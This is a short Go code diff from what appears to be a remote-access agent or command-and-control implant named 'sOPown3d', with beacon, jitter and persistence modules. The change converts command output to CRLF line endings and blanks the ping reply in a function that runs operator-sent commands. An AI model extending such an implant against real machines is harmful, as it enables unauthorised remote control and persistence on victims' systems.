@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"runtime"
 	"sOPown3d/internal/agent/persistence"
+	"strings"
 	"time"
 
 	"sOPown3d/internal/agent/jitter"
@@ -135,7 +136,9 @@ func executeCommand(cmd *shared.Command) string {
 		if err != nil {
 			return fmt.Sprintf("Erreur: %v\n%s", err, string(out))
 		}
-		return string(out)
+
+		output := strings.ReplaceAll(string(out), "\n", "\r\n")
+		return output
 
 	case "info":
 		log.Println("Info: déjà envoyé dans le beacon")
@@ -143,7 +146,7 @@ func executeCommand(cmd *shared.Command) string {
 
 	case "ping":
 		log.Println("Pong!")
-		return "Pong"
+		return ""
 
 	case "persist":
 		log.Println("📋 Vérification persistance…")
